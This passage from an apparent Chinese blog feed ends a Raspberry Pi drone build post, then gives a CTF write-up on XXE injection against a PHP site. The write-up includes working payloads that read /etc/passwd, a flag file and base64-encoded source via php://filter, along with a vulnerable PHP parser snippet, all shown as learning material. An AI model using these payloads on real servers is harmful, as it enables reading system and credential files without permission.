class="line"><span class="meta prompt_"># </span><span class="language-bash">Image Processing configuration parameters</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Image width <span class="keyword">in</span> pixels.</span></span><br><span class="line">width 640</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Image height <span class="keyword">in</span> pixels.</span></span><br><span class="line">height 480</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Maximum number of frames to be captured per second.</span></span><br><span class="line">framerate 15</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Text to be overlayed <span class="keyword">in</span> the lower left corner of images</span></span><br><span class="line">text_left CAMERA1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Text to be overlayed <span class="keyword">in</span> the lower right corner of images.</span></span><br><span class="line">text_right %Y-%m-%d\n%T-%q</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Motion detection configuration parameters</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Always save pictures and movies even <span class="keyword">if</span> there was no motion.</span></span><br><span class="line">emulate_motion off</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Threshold <span class="keyword">for</span> number of changed pixels that triggers motion.</span></span><br><span class="line">threshold 1500</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Noise threshold <span class="keyword">for</span> the motion detection.</span></span><br><span class="line">; noise_level 32</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Despeckle the image using (E/e)rode or (D/d)ilate or (l)abel.</span></span><br><span class="line">despeckle_filter EedDl</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Number of images that must contain motion to trigger an event.</span></span><br><span class="line">minimum_motion_frames 1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Gap <span class="keyword">in</span> seconds of no motion detected that triggers the end of an event.</span></span><br><span class="line">event_gap 60</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The number of pre-captured (buffered) pictures from before motion.</span></span><br><span class="line">pre_capture 3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Number of frames to capture after motion is no longer detected.</span></span><br><span class="line">post_capture 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Script execution configuration parameters</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Command to be executed when an event starts.</span></span><br><span class="line">; on_event_start value</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Command to be executed when an event ends.</span></span><br><span class="line">; on_event_end value</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Command to be executed when a movie file is closed.</span></span><br><span class="line">; on_movie_end value</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Picture output configuration parameters</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Output pictures when motion is detected</span></span><br><span class="line">picture_output off</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">File name(without extension) <span class="keyword">for</span> pictures relative to target directory</span></span><br><span class="line">picture_filename %Y%m%d%H%M%S-%q</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Movie output configuration parameters</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create movies of motion events.</span></span><br><span class="line">movie_output off</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Maximum length of movie <span class="keyword">in</span> seconds.</span></span><br><span class="line">movie_max_time 60</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The encoding quality of the movie. (0=use bitrate. 1=worst quality, 100=best)</span></span><br><span class="line">movie_quality 45</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Container/Codec to used <span class="keyword">for</span> the movie. See motion_guide.html</span></span><br><span class="line">movie_codec mkv</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">File name(without extension) <span class="keyword">for</span> movies relative to target directory</span></span><br><span class="line">movie_filename %t-%v-%Y%m%d%H%M%S</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Webcontrol configuration parameters</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Port number used <span class="keyword">for</span> the webcontrol.</span></span><br><span class="line">webcontrol_port 8080</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Restrict webcontrol connections to the localhost.</span></span><br><span class="line">webcontrol_localhost off</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Type of configuration options to allow via the webcontrol.</span></span><br><span class="line">webcontrol_parms 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Live stream configuration parameters</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The port number <span class="keyword">for</span> the live stream.</span></span><br><span class="line">stream_port 8081</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Restrict stream connections to the localhost.</span></span><br><span class="line">stream_localhost off</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#############################################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Camera config files - One <span class="keyword">for</span> each camera.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#############################################################</span></span></span><br><span class="line">; camera /usr/etc/motion/camera1.conf</span><br><span class="line">; camera /usr/etc/motion/camera2.conf</span><br><span class="line">; camera /usr/etc/motion/camera3.conf</span><br><span class="line">; camera /usr/etc/motion/camera4.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#############################################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Directory to <span class="built_in">read</span> <span class="string">&#x27;.conf&#x27;</span> files <span class="keyword">for</span> cameras.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#############################################################</span></span></span><br><span class="line">; camera_dir /usr/etc/motion/conf.d</span><br><span class="line">stream_maxrate 15</span><br></pre></td></tr></table></figure><p>更改后键入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vcgencmd get_camera</span><br></pre></td></tr></table></figure><p>如果返回：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supported=1 detected=1, libcamera interfaces=0</span><br></pre></td></tr></table></figure><p>则说明成功，使用<code>sudo motion</code> 来启动motion服务，并在浏览器中打开相应ip的8080端口来管理摄像头，通过打开8081端口来查看摄像头画面，使用<code>sudo motion stop</code>来停止motion的服务</p><hr><p>我也尝试过很多其他的摄像头方案，但motion是最稳定同时也还算方便的，于是采用了motion</p><hr><h2 id="树莓派连接地面站以及内网穿透"><a href="#树莓派连接地面站以及内网穿透" class="headerlink" title="树莓派连接地面站以及内网穿透"></a>树莓派连接地面站以及内网穿透</h2><p>在手机谷歌商店中下载mission planner和qgc（qgc也可以在其官网下载app），将地面站安装至手机。确保pixhawk和树莓派均已上电，并且pixhawk已经连接好树莓派，打开树莓派键入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mavproxy.py --master=/dev/ttyAMA0 --aircraft=test --out=127.0.0.1:14550</span><br></pre></td></tr></table></figure><p>这句命令的语法是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mavproxy.py --master=pixhawk连接的端口文件 --aircraft=自己选一个名字 --out=ip:端口</span><br></pre></td></tr></table></figure><p>这里推流到本地端口，然后将本地端口映射出去，就可以通过qgc访问了，推流对带宽的需求不高，2m已经很足够了（你也可以将手机的端口通过natapp映射出去，然后推流到qgc）</p><hr><p>注意事项：<br>1.qgc默认使用14550端口<br>2.地面站软件和mavproxy默认使用udp协议推流，如果要使用tcp协议则要写成<code>--out=tcpin:0.0.0.0:&lt;port&gt;</code>这点会影响到你在内网穿透时隧道的选择（比如natapp不限流量隧道只有tcp）</p><hr><p>除了与地面站的通讯需要内网穿透，ssh以及motion也要内网穿透，具体操作不赘述，课自行查看natapp官网：<a href="https://natapp.cn/">https://natapp.cn/</a></p><h1 id="飞机调试"><a href="#飞机调试" class="headerlink" title="飞机调试"></a>飞机调试</h1><p>一切连接好设置好之后还不能起飞，我们可以根据以下的教程在mission planner里调试（注意飞行模式一定要设置，一定要在mission planner里面设置）同时因为我们没有配遥控器，于是就省去了遥控器调试的部分，建议在mission planner里设置完飞行模式后到qgc里调试，调试方法大同小异，在调试完加速度计，罗盘，地平线，电池等后（需要电流计）：<br>飞控连接地面站以后，初始设置 页面会多出 必要硬件，选择 机架类型 ，选择与图片相应的类型<br><img src="/images/dtest1.jpg"></p><p>注意：新版固件如果不设置机架类型，就会警报：check firmware or FRAME_CLASS</p><p>第三步：加速度校准<br>初始设置 页面，点 加速度计校准</p><p>做加速度计校准前，将飞机水平放置，校准过程会执行 6个动作，每次按电脑回车键或则空格键确认，点击 校准加速度计</p><ol><li>Place vehicle level and press any key(水平放置)完成后回车</li></ol><p><img src="/images/dtest2.jpg"></p><ol start="2"><li>Place vehicle on its LEFT side and press any key（向左边放置）完成后回车</li></ol><p><img src="/images/dtest3.jpg"></p><ol start="3"><li>Place vehicle on its RIGHT side and press any key（向右边放置）完成后回车</li></ol><p><img src="/images/dtest4.jpg"></p><ol start="4"><li>Place vehicle nose DOWN and press any key（向下放置）完成后回车</li></ol><p><img src="/images/dtest5.jpg"></p><ol start="5"><li>Place vehicle nose UP and press any key（向上放置）完成后回车</li></ol><p><img src="/images/dtest6.jpg"></p><ol start="6"><li>Place vehicle on its BACK and press any key（反过来放置）完成后回车</li></ol><p><img src="/images/dtest7.jpg"></p><p>校准完成，会显示calibration Successful。</p><p>如果校准失败，请重新校准。</p><p>第四步：指南针校准</p><p>点击初始设置下的必要硬件菜单，请确保GPS接线正确。</p><p>选择指南针菜单，按下图勾选对应的设置以后点击开始，如下所示：</p><p><img src="/images/dtest8.jpg"></p><p>飞控里面和GPS模块里分别各有一个指南针。</p><p>GPS里集成的指南针一般叫做外置罗盘是1#，飞控里面的指南针叫内置罗盘是2#。</p><p>注意：校准罗盘请远离金属构件、喇叭等强磁性东西。</p><p>校准时要求将飞机每个面都朝上旋转1~2圈（正反均可）。</p><p>1.水平放置旋转1~2周</p><p>旋转的时候注意USB线打结，可顺时针旋转一周，逆时针旋转一周。</p><p>或则用数传模块代替USB线，就能避免USB线缠绕。</p><p><img src="/images/dtest9.jpg"></p><p>2.左侧朝下旋转1~2周</p><p><img src="/images/dtest10.jpg"></p><p>3.右侧朝下旋转1~2周</p><p><img src="/images/dtest11.jpg"></p><p>4.机头朝下旋转1~2周</p><p><img src="/images/dtest12.jpg"></p><p>5.机头朝上旋转1~2周</p><p><img src="/images/dtest13.jpg"></p><p>6.底朝上旋转1~2周</p><p><img src="/images/dtest14.jpg"></p><p>校准过程会伴随着2个进度条的行进，当进度条行进完毕，校准就完成了。如果不能校准，请断开连接检查接线是否正确，重新执行校准。</p><p>校准完成后要求重启飞控。</p><p>重新连接USB后，再连接地面站，指南针页面就能看到指南针的数据。数值小于 400 为绿色代表数值正常可用，当大于 400 黄色代表警告，当超过 600为红色完全不可用。大于400数值需要重新校准。<br>然后，在对飞行模式，手柄等进行调试和设置，以下给出我的一些设置参考：<br><img src="/images/dtest15.jpg"><br><img src="/images/dtest16.jpg"><br><img src="/images/dtest17.jpg"><br><img src="/images/dtest18.jpg"><br><img src="/images/dtest19.jpg"><br><img src="/images/dtest20.jpg"><br><img src="/images/dtest21.jpg"><br><img src="/images/dtest22.jpg"><br>调试好后装上螺旋桨，在电机一栏以很小的速度旋转电机，确保风是吹向地下的，飞机才能起飞</p><h1 id="起飞时刻"><a href="#起飞时刻" class="headerlink" title="起飞时刻"></a>起飞时刻</h1><p>起飞前先使用<code>screen -R 喜欢的名字</code>创建一个screen来运行mavproxy，以防mavproxy掉线，这里的演示时是没有装螺旋桨的，这样不会太危险，实际上电机的转速是非常快的，所以装上螺旋桨飞行时要远离人群，而且要通过练习操作熟练<br>（视频飞机电机的声音会有些大，提前调小一点音量，因为是用github pages做的博客，视频可能加载不出来）<br><video src='/videos/flying.mp4' type='video/mp4' controls='controls'  width='100%' height='100%'><br></video></p><h1 id="飞机保养"><a href="#飞机保养" class="headerlink" title="飞机保养"></a>飞机保养</h1><p>注意以下两点：<br>1.飞机的锂电池一定要使用专门的充电器，这样可以监测电压不至于过充，如果充电器不支持监测电压，那就人工监测bb响的数值，充电时一定要清楚电池是什么电池（比如纳米聚合物电池），每一节电池的满电电压是4.2V，最低电压是3.6V，保存电压是3.8V到3.9V，过放和过充都会影响电池的寿命和性能。<br>2.飞机的四个着陆位置均装上防震海绵胶，有钱的可以买个脚架，但不可以不装任何防护措施</p><h1 id="反思总结"><a href="#反思总结" class="headerlink" title="反思总结"></a>反思总结</h1><p>1.飞机的成本还可以压缩，比如可以购买更小的机架，更便宜的机载电脑和飞控<br>2.可以研究更好更方便，可以直接在地面站观看，基于推流的飞行摄像系统<br>3.飞机的飞行并不好，怀疑是电磁屏蔽导致的，也可能是没有调试好<br>4.应该在电源处加装开关，而不是靠插拔电源线来启动或关闭飞机电源</p>]]></content>
      
      
      <categories>
          
          <category> 个人项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web-XML External Entity Injection(XXE)</title>
      <link href="/2023/08/28/webxxe/"/>
      <url>/2023/08/28/webxxe/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p><img src="/images/webxxe1.PNG"></p><p><img src="/images/webxxe2.PNG"></p><p>题目给出了一个网站，点击左侧相应的汽车名字就会出现相应的图片和数据。一看没什么问题，那么我们就上burp，给浏览器设置代理，访问192.168.1.101，为什么不是127.0.0.1呢？因为访问这个回环地址burp抓不到包，原因未知但可以使用就好了。</p><p><img src="/images/webxxecap1.PNG"></p><p>观察发现，当我们点击左侧汽车名字的时候，实际上我们是post了相应的请求，抓包修改相应位置的汽车名后发现会跳转到不同的汽车页面。思路这就来了：如果我们post一些其他的东西上去，是否会有突破口？</p><h1 id="尝试突破"><a href="#尝试突破" class="headerlink" title="尝试突破"></a>尝试突破</h1><p>首先，我先post了一个不存在的汽车名称：</p><p><img src="/images/webxxefake1.PNG"></p><p>得到这样一个结果：</p><p><img src="/images/webxxerecv1.PNG"></p><p>看起来没有问题，我又思考，这个页面是用php制作的，于是我post了一段php代码：</p><p><img src="/images/webxxefake2.PNG"></p><p>返回这样一个结果：</p><p><img src="/images/webxxerecv2.PNG"></p><p>这个返回很有意思，直接变成不存在了，看来前面的名字没有了，这网站肯定有些问题，但我不知道问题在哪，于是第三次我直接post了一些垃圾数据：</p><p><img src="/images/webxxefake3.PNG"></p><p>返回了一个报错：</p><p><img src="/images/webxxerecv3.PNG"></p><p>得到了一些有价值的信息，有一个函数“simplexml load string”，上网查了一下，这个函数可以把 XML 字符串载入对象中。 如果失败，则返回 false。那么是不是说，如果我故意post一些经过设计的xml数据，这个函数就会执行我的指令呢，找到突破口了！</p><h1 id="XML-External-Entity-Injection-XXE"><a href="#XML-External-Entity-Injection-XXE" class="headerlink" title="XML External Entity Injection(XXE)"></a>XML External Entity Injection(XXE)</h1><p>于是我上网搜索此函数的相关漏洞，发现了XXE漏洞，以下是其简介：</p><p><strong>漏洞介绍</strong></p><p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。</p><p>由于站点的建站语言不同，PHP、JAVA、python等也有不同的解析规则，在实际情况中不能一概而论，但原理是相同的。</p><p><strong>XML基础知识</strong></p><p>XML是用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。</p><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下三种：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///path/to/file.ext</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//url</span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=conf.php</span></span><br></pre></td></tr></table></figure><p>XML在调用外部实体整体的写法如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xdsec</span> [</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">methodname</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span>(实体引用名) <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>(实体内容) &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">methodcall</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">methodname</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">methodname</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodcall</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这种写法则调用了本地计算机的文件<code>/etc/passwd</code>，XML内容被解析后，文件内容便通过<code>&amp;xxe</code>被存放在了<code>methodname</code>元素中，造成了敏感信息的泄露。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>接下来的操作就十分简单了，构造恶意代码，并post到容器中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里直接读取本地的flag并返回到xxe这个变量中，但这串东西不能直接post，要转成url编码格式（连等号也要编码），转化后post到容器：</p><p><img src="/images/webxxeIJ.PNG"></p><p>成功得到flag</p><p> <img src="/images/webxxeflag.PNG"></p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.URL 编码&#x2F;解码</p><p>RFC3986 协议对 URL 的编解码问题做出了详细的建议，指出了哪些字符需要被编码才不会引起 URL 语义的转变，以及对为什么这些字符需要编码做出了相应的解释。</p><p>RFC3986 协议规定 URL 只允许包含以下四种字符：<br>                   1、英文字母（a-zA-Z）<br>                   2、数字（0-9）<br>                   3、-_.~ 4个特殊字符<br>                   4、所有保留字符，RFC3986 中指定了以下字符为保留字符（英文字符）：     ! * ‘ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ]</p><p>本工具使用了 <code>JavaScript</code> 的 <code>decodeURIComponent</code> 方法进行解码，<code>encodeURI</code> 和 <code>encodeURIComponent</code> 方法进行编码。</p><p><code>encodeURI</code> 方法不会对ASCII字母、数字、<del>!@#$&amp;*()&#x3D;:&#x2F;,;?+’ 编码。<br><code>encodeURIComponent</code> 方法不会对ASCII字母、数字、</del>!*()’ 编码。<br><code>encodeURIComponent</code> 比 <code>encodeURI</code> 编码的范围大。<br>因此当你需要编码整个 URL，就用 <code>encodeURI</code>。<br>如果只需要编码 URL 中的参数时，就使用 <code>encodeURIComponent</code>。</p><hr><p>2.以下是一些xxe漏洞的总结，摘录于不同博客，附链接</p><p>首先，我们的目标地址是<code>172.16.12.2/simplexml_load_string.php</code></p><p>我们先来看下<code>simplexml_load_string.php</code>代码怎么写的，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;name;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最开始，引入一个<code>file_get_contents</code>函数，将整个XML数据读入<code>data</code>字符串中，然后交给php的xml解析函数<code>simplexml_load_string()</code>解析，解析后的数据赋给<code>xml</code>变量。</p><p>这一数据即XML字符串中使用的对象(或者说根元素)的数据，并echo输出出来。</p><p>我们现在打开<code>Burpsuite</code>，修改浏览器的网络配置，点击最右侧的三个横线，然后依次点击-&gt;选项-&gt;高级-&gt;网络-&gt;配置firefox如何连接互联网</p><p>设置HTTP代理为<code>127.0.0.1</code>，端口为<code>8080</code>，配置完成后，开启burpsuite的拦截功能，然后访问如下网址</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//172.16.12.2/simplexml_load_string.php</span></span><br></pre></td></tr></table></figure><p><a href="https://static2.ichunqiu.com/icq/resources/fileupload/60475/burpfirefox.gif"><img src="https://static2.ichunqiu.com/icq/resources/fileupload/60475/burpfirefox.gif" alt="burp-firefox"></a></p><p>当访问请求被burp拦截后，点击action将此请求发送到burp的repeater选项卡(send to repeater)，将如下的XML文本直接写在数据包内容的下面</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://static2.ichunqiu.com/icq/resources/fileupload/60475/burpsimple.gif"><img src="https://static2.ichunqiu.com/icq/resources/fileupload/60475/burpsimple.gif" alt="burp_simple"></a></p><p>这一步骤将XML内容发送给服务器，当服务器将XML解析完成后，就会依照解析的内容工作，这段XML中<code>SYSTEM &quot;file:///etc/passwd&quot;</code>部分引用了目标服务器(即<code>172.16.12.2</code>)下的<code>/etc/passwd</code>文件，服务器解析XML内容后，会将这一文件内容存入<code>&amp;xxe</code>中，然后将数据返回给恶意访问者。</p><p>执行完成上面的操作后，点击GO，右侧将出现此数据包的返回结果，内容如下，返回的数据为服务器上<code>/etc/passwd</code>文件的内容</p><p><a href="https://static2.ichunqiu.com/icq/resources/fileupload/60475/resultf.png"><img src="https://static2.ichunqiu.com/icq/resources/fileupload/60475/resultf.png" alt="result_s"></a></p><p>如果修改XML中的外部实体为其他协议，如<code>php://filter/read=convert.base64-encode/resource=index.php</code>，在Proxy选项卡的原数据包中粘贴XML内容，点击FORWARD放行请求，返回的结果在浏览器上显示如下</p><p><a href="https://static2.ichunqiu.com/icq/resources/fileupload/60475/php.gif"><img src="https://static2.ichunqiu.com/icq/resources/fileupload/60475/php.gif" alt="result_p"></a></p><p>返回值为<code>PD9waHANCnBocGluZm8oKTsNCj8+</code>，经过base64解码，可以看到字符串是index.php的源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line"><span 